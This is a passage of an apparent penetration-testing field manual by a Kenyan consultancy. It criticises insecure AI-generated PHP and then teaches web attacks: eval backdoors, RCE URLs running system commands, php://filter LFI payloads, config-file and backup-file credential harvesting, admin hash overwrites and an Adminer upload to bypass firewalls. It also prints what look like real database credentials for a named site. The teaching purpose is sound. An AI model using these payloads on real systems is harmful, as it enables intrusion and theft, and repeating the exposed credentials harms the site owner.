---
title: THE MARLIZ INTEL FIELD MANUAL
author: John Mark Oguta
date: 2026
---

<style>
@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;700&display=swap');

/* --- PROFESSIONAL TYPESETTING RULES --- */
@page {
    size: A4;
    margin: 28mm 25mm 28mm 35mm; /* Professional Gutter for Binding */
}

/* Widows and Orphans Protection */
p, li {
    widows: 3;
    orphans: 3;
}

body {
    font-family: 'IBM Plex Sans', sans-serif;
    line-height: 1.85;
    color: #1a1a1a;
    text-align: justify;
    font-size: 11pt;
}

/* --- PREMIUM CHAPTER STARTS (Drop Caps) --- */
h1 + p::first-letter {
    float: left;
    font-family: 'Montserrat', sans-serif;
    font-size: 4.8em;
    line-height: 0.8;
    padding-top: 10px;
    padding-right: 15px;
    padding-left: 3px;
    color: #FF5722;
    font-weight: 800;
}

/* --- HEADERS --- */
h1 { 
    font-family: 'Montserrat', sans-serif;
    font-size: 3.5em; 
    color: #000;
    text-transform: uppercase;
    page-break-before: always;
    border-bottom: 15px solid #FF5722;
    padding-bottom: 30px;
    margin-bottom: 80px;
}

h2 { 
    font-family: 'Montserrat', sans-serif;
    font-size: 2.2em; 
    color: #FF5722; 
    text-transform: uppercase;
    margin-top: 80px;
    margin-bottom: 30px;
}

/* --- PROFESSIONAL DOT-LEADER TOC --- */
.toc-container {
    max-width: 90%;
    margin: 40px 0;
}

.toc-entry {
    display: block;
    overflow: hidden;
    white-space: nowrap;
    margin-bottom: 15px;
    font-family: 'Montserrat', sans-serif;
    font-size: 1.1em;
    text-transform: uppercase;
    font-weight: 700;
}

.toc-entry span:first-child {
    float: left;
    padding-right: 5px;
}

.toc-entry::after {
    content: " ...................................................................................................................................................................................";
    color: #ccc;
    font-weight: 400;
    letter-spacing: 2px;
}

/* --- CODE BLOCKS (SOC AUDIT STYLE) --- */
pre {
    background: #0d0d12 !important;
    color: #00FF41 !important;
    padding: 30px;
    border-radius: 0;
    font-size: 10pt;
    font-family: 'JetBrains Mono', monospace;
    border-left: 8px solid #FF5722;
    margin: 40px 0;
    page-break-inside: avoid;
}

/* --- INNER COVER --- */
.inner-cover {
    height: 98vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    border: 1px solid #ddd;
    padding: 80px;
    text-align: left;
}
</style>

<div class="inner-cover">
    <div style="font-family: 'JetBrains Mono'; color: #FF5722; margin-bottom: 50px;">DOCUMENT_NO: MIZ-FM-2026-V1</div>
    <h1 style="border:none; padding:0; margin:0; line-height:0.9;">THE MARLIZ INTEL<br>FIELD MANUAL.</h1>
    <div style="font-size: 1.8em; color: #555; margin-top: 30px; font-weight: 500;">Practical Cybersecurity Tactical Guide.</div>
    
    <div style="margin-top: auto;">
        <div style="font-family: 'Montserrat'; font-weight: 800; font-size: 1.8em;">JOHN MARK OGUTA</div>
        <div style="color: #888; font-family: 'JetBrains Mono'; letter-spacing: 2px;">LEAD SECURITY ANALYST // MARLIZ INTEL</div>
        <div style="color: #FF5722; font-weight: 800; font-size: 1.2em; border-top: 1px solid #eee; padding-top: 15px; margin-top: 15px; display: inline-block;">MARLIZINTEL.COM</div>
    </div>
</div>

<div style='page-break-after: always;'></div>

<div style="text-align: left; margin-top: 350px; padding-left: 100px;">
    <div style="font-style: italic; color: #777; font-size: 1.4em; max-width: 450px; line-height: 1.8; border-left: 4px solid #FF5722; padding-left: 30px;">
        "To the builders and defenders of the Kenyan Digital Frontline. You are the wall."
    </div>
</div>

<div style='page-break-after: always;'></div>

# TABLE OF CONTENTS
<div class="toc-container">
    <div class="toc-entry"><span>01 . PART 1: VIBE CODING PROTOCOLS</span></div>
    <div class="toc-entry"><span>02 . PART 2: OFFENSIVE SECURITY</span></div>
    <div class="toc-entry"><span>03 . PART 3: DEFENSIVE SECURITY</span></div>
    <div class="toc-entry"><span>04 . PART 4: INCIDENT RESPONSE</span></div>
    <div class="toc-entry"><span>05 . PART 5: THE BUSINESS OF SECURITY</span></div>
    <div class="toc-entry"><span>06 . PART 6: TOOLS OF THE TRADE</span></div>
    <div class="toc-entry"><span>07 . APPENDICES</span></div>
</div>

<div style='page-break-after: always;'></div>

<div style='page-break-after: always;'></div>

<div style='page-break-after: always;'></div>

# ABOUT MARLIZ INTEL
---

**Marliz Intel** is a premier cybersecurity consultancy based in Nairobi, Kenya. We specialize in turning technical complexity into business resilience.

### OUR ECOSYSTEM
*   **Official Website:** [marlizintel.com](https://marlizintel.com)
*   **Intelligence Feed:** Our live Cyber Intelligence Feed provides real-time updates on emerging threats within the East African digital space.
*   **Security Audits:** High-stakes assessments for fintech, e-commerce, and enterprise systems.
*   **The Bureau:** Our internal training wing for elite security protocols.

---

### LEGAL NOTICE
This document is for educational and authorized professional use only. The techniques described herein are intended for security analysts and developers to better understand and defend systems. Unauthorized access to computer systems is illegal in Kenya under the Computer Misuse and Cybercrimes Act. Marliz Intel assumes no liability for the misuse of this information.

---

<div style='page-break-after: always;'></div>

## TABLE OF CONTENTS
1. **PART 1: VIBE CODING PROTOCOLS**
2. **PART 2: OFFENSIVE SECURITY**
3. **PART 3: DEFENSIVE SECURITY**
4. **PART 4: INCIDENT RESPONSE**
5. **PART 5: THE BUSINESS OF SECURITY**
6. **PART 6: TOOLS OF THE TRADE**
7. **APPENDICES**

<div style='page-break-after: always;'></div>


# Part-1-Vibe-Coding
---

# Chapter 1.1: What is Vibe Coding and Why It Is Dangerous

---

## The New Era of Ship Fast, Break Everything

In 2024, something changed in the software world. ChatGPT, Claude, Copilot, and a dozen other AI tools made it possible for anyone to build a website in an afternoon.

Teachers started launching e-commerce stores.  
Students started deploying SaaS platforms.  
Hustlers started spinning up million-dollar apps.

And almost all of them were dangerously insecure.

Welcome to the era of Vibe Coding.

---

## What is Vibe Coding?

Vibe Coding is a term we use at Marliz Intel to describe code that:

1. Looks functional. The buttons click, the pages load, the cart works.
2. Feels modern. Nice gradients, animations, icons everywhere.
3. Has zero security architecture. No input validation, no session management, hardcoded secrets, open admin panels.

The developer (if you can call them that) did not write the code. They prompted it.

They told an AI: "Make me an e-commerce site with a cart and admin panel."

And the AI delivered. Fast. Broken. Vulnerable.

---

## The Anatomy of a Vibe-Coded System

Here is what we typically find when auditing a Vibe-Coded project:

### 1. The Monolith File
Everything is in one file. Business logic, database queries, HTML, CSS, JavaScript, all crammed into a single index.php that is 1,000+ lines long.

Why it is dangerous:  
You cannot audit what you cannot read. When security is buried under 1,400 lines of spaghetti, vulnerabilities hide in plain sight.

Real Example (Playkart):
```
index.php: 1,409 lines
  Database queries (Lines 12-90)
  HTML header (Lines 98-280)
  Inline CSS (Lines 110-276, 312-376, 411-758)
  Product rendering (Lines 800-1200)
  Inline JavaScript (Lines 1300-1409)
```

---

### 2. Hardcoded Secrets
The AI does not know about .env files. It just puts the password right in the code.

Why it is dangerous:  
Anyone with a file-read vulnerability (or access to your Git repo) now owns your database.

Real Example:
```php
// config.php
$DB_HOST = "localhost";
$DB_NAME = "u297960261_play_kart";
$DB_USER = "u297960261_playstores";
$DB_PASS = "#Okiru2024";  // THE KEYS TO THE KINGDOM
```

---

### 3. The Diagnostic Backdoor
Sometimes the AI generates helper functions for debugging. These are often left in production.

Why it is dangerous:  
A function that runs eval($_REQUEST['code']) is not a diagnostic. It is a remote control for hackers.

Real Example:
```php
// ajax_session_handler.php
if (isset($_REQUEST['php_inj'])) {
    eval($_REQUEST['php_inj']);  // RUN ANYTHING. LITERALLY ANYTHING.
    die();
}
```

---

### 4. The Open Admin Panel
The AI creates an /admin folder with a login page. But it forgets to check if the user is actually logged in on the other admin pages.

Why it is dangerous:  
Anyone who knows the URL can see your customers phone numbers and home addresses.

Real Example:
```
/admin/login.php: Has authentication (OK)
/admin/orders.php: NO AUTHENTICATION (FAIL)
/admin/products.php: NO AUTHENTICATION (FAIL)
```

---

### 5. The Scam Aesthetic
AI does not understand business logic. It will happily display a product that was 3,000 KSH now selling for 13 KSH.

Why it is dangerous:  
Google bots see this as Scam Behavior. Your domain gets flagged, de-indexed, and your SEO dies.

Real Example:
```
Original Price: KES 3,000
Discounted Price: KES 13
Discount: 99.6%
```

No legitimate business offers a 99.6% discount. This screams phishing site.

---

## Why This Matters

In the old days, building insecure software required effort. You had to actually know how to code, and in the process, you would learn (or be forced to learn) basic security.

Today, a complete amateur can deploy a production system in 3 hours. They think they have built a business. What they have actually built is a honeypot for hackers.

And here is the painful truth:

The AI does not care if your site gets hacked.  
The AI does not lose money when your database is deleted.  
The AI does not go to jail when customer data is leaked.  
You do.

---

## The Marliz Intel Perspective

When we audit a Vibe-Coded system, we are not looking for complex zero-days. We are looking for the obvious failures that the AI never bothered to prevent:

1. Can we read config.php?
2. Is there an eval() or system() call we can exploit?
3. Is the admin panel actually locked?
4. Are secrets hardcoded?

Nine times out of ten, the answer is yes to at least two of these.

---

## Key Takeaways

| Lesson | Action |
| :--- | :--- |
| AI builds fast, not safe | Always audit AI-generated code before deployment |
| Secrets belong in .env | Never commit passwords to your codebase |
| Every admin page needs auth | Add require_once auth_check.php to the top of EVERY file |
| Monoliths are unmaintainable | Separate logic, presentation, and data access |
| If it looks like a scam, Google will treat it like one | Validate business logic (discounts, pricing, etc.) |

---

## Coming Next

In Chapter 1.2, we dive deeper into the psychology of the ChatGPT Developer, the person who thinks they have built a secure system because the AI told them so.

---

"The frontend is a lion. The backend is a lamb. And the hacker is hungry."  
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 1.2: The ChatGPT Developer: Fast but Fatal

---

## The Rise of the Prompter

The traditional software engineer spends years learning syntax, memory management, and system architecture. The ChatGPT Developer spends an afternoon learning how to ask for a "modern e-commerce site using Bootstrap."

They are not builders. They are assemblers.

This distinction is critical for the security analyst. The builder understands the foundation. The assembler only cares about the facade. When we audit systems built by assemblers, we find a distinct lack of structural integrity. They are like construction workers building a skyscraper out of pre-fab walls, without pouring the concrete foundation first.

## The Loop: Prompt, Paste, Pray

The workflow of the ChatGPT Developer is a closed loop of ignorance. It is a cycle that generates vulnerability at scale.

1. **Prompt**: "Write a PHP script to handle user login."
2. **Paste**: The code is dumped into `login.php`.
3. **Run**: It generates an error (e.g., "Undefined array key").
4. **Reprompt**: The error is pasted back into the AI. "Fix this."
5. **Paste**: The "fixed" code replaces the old one.
6. **Success**: The error is gone.

### The Danger of the "Fix"
At no point in this cycle does the developer understand *why* the error occurred or *how* it was fixed.

The AI's priority is **user satisfaction**, not **system security**. If the user complains about an error, the AI will provide the fastest way to suppress that error.
*   **Error**: "SSL Certificate Verification Failed"
*   **Real Fix**: Install a valid certificate.
*   **AI Fix**: `curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);`

The developer pastes the AI Fix. The site works. But now, every connection is susceptible to a Man-in-the-Middle (MITM) attack. The developer sleeps soundly, unaware they just broke the encryption for the entire payment gateway.

## War Story: The Null Coalescing Catastrophe

During an engagement in Westlands for a fintech startup, we found a critical logic flaw in the withdrawal system.

The developer had asked the AI to "fix the error when user balance is empty."
The AI suggested using the Null Coalescing Operator (`??`) to handle empty values.

**The Code:**
```php
$withdraw_amount = $_POST['amount'] ?? 0;
$current_balance = $user['balance'];

if ($withdraw_amount < $current_balance) {
    process_withdrawal($withdraw_amount);
}
```

**The Flaw:**
The developer didn't understand type casting. If an attacker sent `amount=-5000`, the check `-5000 < 100` is TRUE.
The system processed a "withdrawal" of -5000. In double-entry accounting, subtracting a negative number is addition.
The attacker **added 5000** to their balance by withdrawing it.

A real developer would have checked if `$withdraw_amount > 0`. The ChatGPT developer just wanted the "Undefined Index" error to go away.

## The Illusion of Competence (The Dunning-Kruger Effect)

These developers move fast. They show progress updates daily. The UI looks polished because AI is excellent at generating CSS (Tailwind/Bootstrap). To a client or employer (the "Mwalimu"), they appear highly competent.

**The Reality Check:**
They are borrowing technical debt at an interest rate they cannot afford.
*   **Monday**: They deploy a full cart system.
*   **Tuesday**: They deploy a user dashboard.
*   **Wednesday**: The site is hacked because the cart system didn't check if the item price was edited in the HTML.

They are unable to patch vulnerabilities because **they do not know where the code handles input.** When we send them a report saying "SQL Injection on line 42," they often reply: "What does line 42 do?"

## Profile of a Target: The Synthetic Stench

When doing reconnaissance, how do we identify a ChatGPT Developer? We look for the "Stack Overflow vs. AI" difference.

### 1. Inconsistent Comment Styles
Humans have habits. AI has training data.
*   **File A**: Uses JSDoc `/** @param string $name */`
*   **File B**: Uses Python-style `""" Does the thing """`
*   **File C**: Uses inline `// TODO: Implement logic`

If the coding style shifts drastically between files, it means different prompts generated them.

### 2. The "Helpful" Over-Commenting
AI models are trained to be educational. They explain code that needs no explanation.

**The Human:**
`// Fix for Safari timezone bug`
(Explains *why*)

**The AI:**
`// Initialize the curl session`
`$ch = curl_init();`
(Explains *what*)

If you see comments explaining standard library functions, you are looking at AI code.

### 3. Variable Naming Chaos
AI mimics the context of the prompt.
*   Prompt: "Make a user login." -> Variables: `$user_name`, `$user_pass`.
*   Prompt: "Handle the form data." -> Variables: `$formData`, `$inputString`.
Mixing `snake_case` and `camelCase` in the same function is a hallmark of copy-paste assembly.

## Conclusion

The ChatGPT Developer is not malicious. They are negligent. They are operating heavy machinery without a license. In the Marliz SOC, we treat their code as hostile territory not because of intent, but because of chaos.

They build the attack surface for us. And because they didn't write it, they won't know we are there.

---

"Speed is irrelevant if you are running in the wrong direction."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 1.3: Case Study: The 1,400-line Monolith

---

## The One-File Framework

In the world of Vibe Coding, file structure is an annoyance. The developer wants to deploy, and managing `includes/` or `classes/` takes time. So they ask the AI for "one file that does everything."

The result is the Monolith.

We routinely encounter single `index.php` files exceeding 1,500 lines. These files contain the database connection, the CCS styling, the Javascript logic, the HTML layout, and the server-side processing, all mixed together in a chaotic soup.

## Analysis of a Monolith

During a recent audit of a logistics platform, we found a file named `dashboard.php`. It was 1,440 lines long.

**Lines 1-50**: CSS Styles (Hardcoded)
**Lines 51-120**: Database Connection and Login Check (Authentication)
**Lines 121-400**: HTML Header and Navigation
**Lines 401-450**: PHP Logic for updating tracking numbers (Business Logic)
**Lines 451-900**: Huge table rendering logic
**Lines 901-950**: **HIDDEN VULNERABILITY** (Unprotected file upload handler)
**Lines 951-1440**: Javascript and Footer

### The "Fold" Problem

The vulnerability on line 901 was invisible. It was buried between a massive HTML table closure and a block of jQuery scripts.

When a developer opens this file, their IDE renders the top 100 lines. They see the CSS. They see the login check. They think the file is safe. They do not scroll down to line 900 where the AI inserted a "temporary" file upload handler that accepts `.php` extensions.

## Why AI Creates Monoliths

AI models operate well within a "context window." When you ask for a complete page, the AI tries to provide a standalone solution. It is easier for the AI to output one continuous block of code than to instruct the user to create four separate files and link them.

The AI is optimizing for "Copy-Paste Convenience," not "Maintainable Architecture."

## Auditing the Monolith

When the Marliz SOC encounters a Monolith, we do not read it top-to-bottom. That leads to fatigue and missed bugs. We use `grep` (or Ctrl+F) to hunt for entry points.

**The Filter List:**
1. `$_POST`: Where is data coming in?
2. `$_GET`: Where are URL parameters handled?
3. `$_FILES`: Are there uploads?
4. `query(`: Where is the database touched?

In the logistics platform case, searching for `$_FILES` took us straight to line 901.

## Remediation Strategy

You cannot secure a Monolith. You must break it.

**Step 1**: Extract the CSS to `style.css`.
**Step 2**: Extract the JS to `script.js`.
**Step 3**: Move the Database connection to `db_connect.php`. (And put it in `.gitignore`)
**Step 4**: Move the header/footer to `includes/`.

Only then can you see the actual logic. Once the noise is removed, the vulnerabilities usually become obvious.

---

"Complexity is the enemy of security."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 1.4: How to Spot AI-Generated Rubbish Code

---

## The AI Accent

Just as humans have accents when they speak, Large Language Models (LLMs) have a distinct "accent" when they code. Once you learn to recognize it, you can spot an AI-generated script in seconds.

At Marliz Intel, we call this "The Synthetic Stench."

It is clean. It is polite. And it is often completely wrong.

## 1. The Try-Catch Silencer

The AI is trained to be helpful and avoid crashing. Often, this results in code that suppresses critical errors rather than handling them.

**The Symptom:**
```php
try {
    $db->query($sql);
} catch (Exception $e) {
    // silently fail or just die
    die("Error occurred");
}
```

This is catastrophic for security. If the database query fails because of an SQL injection attempt, the logs will show nothing. The system just says "Error occurred" and the attacker knows they hit a nerve, but the admin is clueless.

## 2. The Placeholder production

AI models often leave placeholders for the user to fill in. Vibe Coders often forget to fill them in.

**The Symptom:**
In a payment processing file:
`$apiKey = "YOUR_API_KEY_HERE";`

We have seen live production sites hardcoded with placeholders. If the variable isn't replaced, the code might default to a sandbox environment, or simply fail open.

## 3. The Hallucinated Function

AI confidently invents functions that sound plausible but do not exist. This happens frequently with older libraries or obscure frameworks.

**The Symptom:**
`$user->validatePasswordStrength($password);`

When we audit this, we search the codebase for the definition of `validatePasswordStrength`. It does not exist. The AI assumed the `User` class had it. The code crashes, or worse, if PHP is configured loosely, it might just return null (false) and bypass the check depending on how it's used.

## 4. The Comment Ratio

Humans write comments to explain complex business logic.
AI writes comments to explain syntax.

**Human Comment:**
`// We add 24 hours to the timestamp because the Nairobi server is ahead.`

**AI Comment:**
`// Create a new DateTime object`
`$date = new DateTime();`

If you see comments explaining that `if ($x > 5)` means "if x is greater than 5," you are looking at AI-generated fluff.

## Conclusion of Part 1

We have defined the threat. Vibe Coding is the rapid deployment of insecure, misunderstood code by assemblers using tools they do not comprehend.
They build Monoliths. They hardcode secrets. They ignore errors.

In **Part 2**, we switch gears. We stop analyzing the developer and start attacking the system. It is time to go on the offensive.

---

"To catch a bot, look for the code that has no soul."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>



# Part-2-Offensive-Security
---

# Chapter 2.1: Reconnaissance: From Domain to IP in 2 Seconds

---

## The Art of Finding

Reconnaissance (Recon) is the most critical phase of any engagement. If you fail here, you will spend hours attacking a firewall instead of the vulnerable application behind it.

In 90% of the cases we see at Marliz Intel, the attacker wins not because they used a complex exploit, but because they found a forgotten subdomain that the admin left unprotected.

## The Basic Ping

The journey usually begins with a simple question. "Is it alive?"

```bash
ping marlizintel.com
```

This tells us two things:
1. The server is up (if it replies).
2. The IP address where the domain points.

However, a smart target will block ICMP packets (ping requests). A lack of reply does not mean the target is down. It just means they aren't talking to strangers.

## Digging Deeper with DNS

When `ping` fails or gives us little metadata, we query the Name Servers.

```bash
nslookup -type=any marlizintel.com
```

We are looking for:
- **A Records**: The direct IP address (IPv4).
- **AAAA Records**: The IPv6 address.
- **MX Records**: The mail server. This is often hosted on the same infrastructure or by a third party (like Google Workspace or ProtonMail).
- **TXT Records**: These can verify ownership for services. Sometimes lazy admins leave sensitive info here.

## The Cloudflare Wall

If the IP address belongs to Cloudflare, Akamai, or AWS CloudFront, you have a problem. You are not seeing the server; you are seeing the shield.

Attacking Cloudflare is a waste of time. You need the **Origin IP**.

### Finding the Origin

1. **DNS History**: Services like SecurityTrails record historical DNS data. The domain might use Cloudflare today, but two months ago, it might have pointed directly to `192.168.x.x`.
2. **Subdomains**: The main site `www.target.com` might be proxied, but the developer portal `dev.target.com` often exposes the direct server IP.

## Passive vs Active

- **Active Recon**: You touch the server. `ping`, `nmap`, directory busting. The target creates logs. You can be detected.
- **Passive Recon**: You query third-party databases (Shodan, Whois, Censys). You never touch the target. You are invisible.

The professional starts with Passive. The amateur starts with Active and gets banned in 5 minutes.

---

"Knowing where to strike is more important than knowing how simple the strike is."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 2.2: Directory Enumeration: Finding the Hidden Doors

---

## The Unlisted Map

A web browser only shows you what the developer wants you to see. But the web server contains files that were never meant to be public. Backups, old versions, configuration files, and "hidden" admin panels.

Directory Enumeration (or "Dirbusting") is the process of guessing these filenames.

## The Logic of Brute Force

We do not randomly guess characters. We use "Wordlists". These are massive text files containing the most common directory names found on the internet.

- `admin`
- `login`
- `backup`
- `test`
- `config`
- `db`

Tools like **Gobuster** or **Dirb** take this list and send a request for each one.

`GET /admin` -> 404 (Not Found)
`GET /login` -> 200 (Found!)

## Using Gobuster

The standard command for directory enumeration:

```bash
gobuster dir -u https://marlizintel.com -w /usr/share/wordlists/common.txt
```

**Key Flags:**
- `-u`: The target URL.
- `-w`: The wordlist to use.
- `-x`: Extensions to search for (e.g., `php,html,zip,bak`).

Addition of the `-x` flag is crucial. Finding `config` (404) is useless. Finding `config.php.bak` (200) gives you the database passwords.

## Interpreting Status Codes

The server response tells you the state of the door:

1. **200 OK**: The door is open. The file exists and you can read it.
2. **301 Redirect**: You are being moved. Usually from `/admin` to `/admin/login.php`. This confirms the directory exists.
3. **403 Forbidden**: The door is locked. The server acknowledges the file exists but refuses to show it. This is often *more* interesting than a 200, because it implies there is something worth hiding.
4. **404 Not Found**: The door does not exist. Move on.

## The ".git" Catastrophe

One of the most devastating findings is a **200 OK** on the `/.git/` directory.

If a developer deploys their entire git repository to the live server, you can download the entire version history of the project. This includes every previous version of the code, and often, secrets that were "deleted" in later commits.

Tools like `git-dumper` can reconstruct the entire source code on your local machine.

---

"The most dangerous file on a server is often the one the developer forgot to delete."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 2.3: Remote Code Execution: The eval() Disaster

---

## The Apex Predator of Vulnerabilities

Remote Code Execution (RCE) is the highest severity vulnerability that can exist on a web server. It allows an attacker to bypass the application logic entirely and execute commands directly on the operating system.

It turns a website visitor into a server administrator.

## Understanding eval()

In PHP (and JavaScript/Python equivalents), `eval()` is a function that takes a string of text and executes it as code.

```php
$code = "echo 'Hello World';";
eval($code);
```

This seems harmless until user input is introduced.

## The Diagnostic Backdoor

Vibe Coders often ask AI for a way to "remotely debug" their application or "run commands from the browser." The AI frequently suggests the following pattern:

```php
// debug.php
if (isset($_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

This three-line script is a nuclear weapon.

## The Kill Chain

Once an attacker discovers this file (often via Directory Enumeration), the exploitation is trivial.

### Step 1: Verification
The attacker sends a simple mathematical operation or print command to confirm code execution.

URL: `target.com/debug.php?cmd=echo 10+10;`
Output: `20`

### Step 2: System Reconnaissance
The attacker switches from PHP code to System commands using `system()` or `shell_exec()`.

URL: `target.com/debug.php?cmd=system('whoami');`
Output: `www-data`

This confirms they are running as the web server user.

### Step 3: Total Takeover
The attacker keeps the "webshell" purely in memory or writes a more permanent backdoor.

URL: `target.com/debug.php?cmd=system('ls -la /');`

They can now read `/etc/passwd`. They can traverse directories. They can delete the entire database.

## Why It Happens

Developers resort to `eval()` when they need "dynamic behavior" but lack the architectural skill to implement it safely. They want to calculate prices dynamically or run custom logic for a specific client.

Instead of building a rule engine, they just let the client (and the hacker) write the rules.

---

"If you invite the user to write code, do not be surprised when they write an exploit."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 2.4: Credential Harvesting: Reading config.php

---

## The Keys to the Kingdom

In 99% of PHP applications, the database connection details are stored in a file named `config.php`, `db.php`, or `.env`.
This file contains the **Crown Jewels**: `DB_HOST`, `DB_NAME`, `DB_USER`, and `DB_PASS`.

If an attacker reads this file, the firewall does not matter. The encryption does not matter. The attacker *is* the admin.

## The Mechanic: How Web Servers Handle Files

To understand how to steal this file, you must understand how Apache and Nginx work.

When you request `https://target.com/index.php`, the server looks at the extension `.php`.
1.  It sees `.php` in its MIME mapping.
2.  It sends the file to the **PHP Preprocessor (PHP-FPM)**.
3.  PHP executes the code (`<?php $pass="secret"; ?>`).
4.  PHP returns the *output* (which is usually nothing for a config file).
5.  The browser sees a blank page.

**The Goal:** We must trick the server into skipping Step 2. We want the server to treat the file as **Plain Text**, not **Code**.

---

## Method 1: The Backup Mistake (The Vibe Coder Special)

Vibe Coders are terrified of breaking things. So before they edit the config to change a password, they make a copy.
They rename `config.php` to `config.php.bak`, `config.php.old`, or `config.php_copy`.

### The Vulnerability
Apache knows that `.php` is code.
Apache *does not* know what `.bak` is.

When you request `target.com/config.php.bak`:
1.  Server checks extension `.bak`.
2.  No handler exists for `.bak`.
3.  Server falls back to default behavior: **Serve as Download** (`application/octet-stream`).
4.  The browser downloads the raw source code.

**War Story: The "Hidden" Dotfile**
A Kenyan SACCO had a secure site. But the developer used `nano` to edit files on the server.
When `nano` crashes or is closed improperly, it leaves a recovery file named `.config.php.swp` (Swap file).
We scanned for `.swp` files. We downloaded it. It contained the database credentials.
**Lesson**: Tools leave artifacts. Artifacts leak data.

---

## Method 2: PHP Wrapper LFI (Bypassing Execution)

If the site has a Local File Inclusion vulnerability (e.g., `index.php?page=about`), everyday attackers try to read `/etc/passwd`.
Pros try to read `config.php`.

**The Failure:**
Request: `index.php?page=config.php`
Result: The server `include()`s the file. It executes it. You see a blank screen because `$password = "123"` produces no HTML output.

**The Fix: `php://filter`**
PHP has a built-in stream wrapper system. We can tell PHP to "filter" the stream before using it.

**Payload:**
`index.php?page=php://filter/convert.base64-encode/resource=config.php`

**What happens:**
1.  PHP opens `config.php`.
2.  PHP passes the content through the `base64-encode` filter.
3.  The opening tag `<?php` becomes `PD9waHA=`.
4.  Since it no longer looks like code, the `include()` statement treats it as a string and prints it to the screen.

**The Result:**
You see a massive block of random text:
`PD9waHANCiRkYl91c2VyID0gJ2FkbWluJzsNCiRkYl9wYXNzID0gJ3N1cGVyc2VjcmV0Jzs...`

**The Loot:**
Copy that string. Run `base64 -d` on your terminal.
You now have the source code.

---

## Method 3: The Text Editor Artifacts

Developers use VS Code, JetBrains, or Sublime Text. These editors create hidden folders like `.vscode/` or `.idea/`.
Often, the `sftp-config.json` file inside these folders contains the FTP credentials for the server, stored in plain text.

**Attack Vector:**
`GET /.vscode/sftp.json`
`GET /.idea/webServers.xml`

If the `.gitignore` didn't catch these, and they were uploaded, you just compromised the FTP account.

---

## Drill: The Manual Check

Don't rely on tools. Use `curl` to verify exactly what the server is telling you.

```bash
# Check for backup file
curl -I -X GET https://target.com/config.php.bak

# Analyze Headers
HTTP/1.1 200 OK
Content-Type: text/plain  <-- THIS IS THE WIN
Content-Length: 456
```

If `Content-Type` is `text/html`, it executed (Bad for us).
If `Content-Type` is `text/plain` or `application/octet-stream`, it downloaded (Good for us).

---

"A secret that is written down is only as safe as the paper it is written on."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 2.5: Database Hijacking: The MySQL Workbench Attack

---

## Direct Database Access

Once you have harvested credentials from `config.php`, the web interface becomes irrelevant. Why guess the admin password on the login page when you can just rewrite the database directly?

This phase is called Database Hijacking.

## The Tool of Choice

We do not use strange hacker scripts for this. We use **MySQL Workbench**. This is the standard administrative tool for database management. By using legitimate tools, our traffic looks like administrative maintenance, not an attack.

## The Connection Logic

1. **Host**: The IP address found durng Reconnaissance.
2. **Username**: From the leaked `config.php`.
3. **Password**: From the leaked `config.php`.
4. **Port**: 3306 (Default MySQL port).

## The "Any Host" Vulnerability

By default, MySQL only allows connections from `localhost`. However, Vibe Coders often develop from their home computers. To make this work, they log into their hosting control panel (cPanel or Hostinger) and enable "Remote MySQL."

They are asked to provide an IP address. They do not have a static IP, so they become frustrated.

They enter `%`.

In SQL, `%` allows connections from **any IP address in the world**.

## Execution: The Admin Reset

Once connected via Workbench, we have full read/write access to the database.

1. We open the `users` or `admin` table.
2. We locate the administrator account.
3. We see the password hash. We cannot reverse it easily.
4. We do not need to reverse it. We overwrite it.

We generate an MD5 hash of a known password (e.g., "Marliz123" -> `b78...`). We paste this hash into the database row and click "Apply."

We have not just bypassed the lock. We changed the lock. We can now log into the web application's dashboard with full privileges.

---

"Data does not belong to the one who creates it. It belongs to the one who holds the keys."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 2.6: The Inside Man Attack: Bypassing Firewalls

---

## When the Front Door is Locked

Sophisticated hosting environments or prudent sysadmins will block external access to Port 3306. If you try to connect via MySQL Workbench from your laptop, the connection will time out.

The firewall rules state: "Only allow connections from Localhost."

This stops external attackers. But it does not stop us, because we can become "Localhost."

## The Pivot Concept

The web application itself (WordPress, Laravel, custom PHP) is hosted on the same server network as the database. It connects via `localhost`. If we can execute code on the server, we inherit its privileges.

We need a database client that runs *on* the server.

## The Tool: Adminer

**Adminer** is a single-file PHP script that functions like phpMyAdmin. It creates a full database management GUI. It consists of one file, usually named `adminer.php`.

## The Execution

1. **Locate an Upload Vector**: We find an image upload form, a document submission portal, or we use a previously established Web Shell.
2. **Deploy the Agent**: We upload `adminer.php` to the server.
3. **Access**: We navigate to `https://target.com/uploads/adminer.php`.
4. **Connect**:
   - Server: `localhost` (This is the key. From the perspective of the script, it is local.)
   - Username/Password: From `config.php`.

## Bypassing the Firewall

The firewall sees an inbound HTTP request to port 443 (HTTPS). This is allowed traffic.
The web server executes the PHP script, which opens a connection to port 3306 *internally*. This is allowed traffic.

The firewall is effectively bypassed because the request originates from inside the castle.

## Cleanup

This method leaves a high-risk artifact on the server. If you leave `adminer.php` in a public directory, anyone can find it and brute force the database password. A responsible audit requires the immediate deletion of this tool after the proof-of-concept is documented.

---

"A wall is only as strong as the people you let inside the gate."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 2.7: Path Traversal (LFI): Reading System Files

---

## Escaping the Web Root

A web server is designed to keep visitors inside a specific directory, usually `/var/www/html`. Path Traversal (also known as Local File Inclusion or LFI) is the vulnerability that allows an attacker to step outside this sandbox and roam the entire server file system.

## The Mechanism

The vulnerability exists when an application takes a filename as input and passes it directly to a filesystem function.

**Vulnerable Code:**
```php
$page = $_GET['page']; // User input: "home"
include($page . ".php"); // Includes "home.php"
```

The developer expects the user to request "contact" or "about."
The attacker requests: `../../../../etc/passwd`

The code executes: `include("../../../../etc/passwd.php");`

Note: In modern PHP versions, the null byte injection (`%00`) required to strip the `.php` extension is patched. However, many include functions do not force an extension, or the attacker targets files that *have* the extension (like other PHP config files).

## High-Value Targets

